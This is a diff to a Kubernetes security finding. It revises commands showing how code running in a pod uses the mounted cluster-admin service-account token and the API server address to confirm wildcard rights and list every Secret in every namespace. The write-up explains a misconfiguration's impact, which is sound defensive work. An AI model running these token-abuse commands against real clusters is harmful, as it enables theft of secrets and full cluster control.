@@ -79,18 +79,28 @@ The pod runs as a service account that is bound to `cluster-admin` via a
 `ClusterRoleBinding`. Its projected token is mounted into the pod, so anyone with
 code execution in the pod inherits full cluster control:
 
+The pod image is `nginx:1.27-alpine` (no `kubectl`) and runs with
+`hostNetwork: true`, so it uses the node's DNS and cannot resolve the in-cluster
+name `kubernetes.default.svc`. Both are non-issues: Kubernetes injects the API
+server's address as env vars into every pod, and `curl` is all you need.
+
 ```bash
 # Inside the pod
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER=https://kubernetes.default.svc
 CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+# Reach the API server by IP (injected env vars) - no cluster DNS needed
+APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
 
-# Confirm the blast radius - this token can do anything
+# Confirm the blast radius - a SelfSubjectRulesReview is a POST with a body
 curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
-  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews ...
+  -H "Content-Type: application/json" -X POST \
+  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
+# cluster-admin tell: resourceRules with "verbs":["*"],"apiGroups":["*"],"resources":["*"]
 
-# In practice: read every Secret in every namespace
-kubectl --token="$TOKEN" get secrets --all-namespaces
+# In practice: read every Secret in every namespace (values are base64)
+curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/secrets | grep '"name"'
 ```
 
 `cluster-admin` on a workload service account means: read every Secret in every
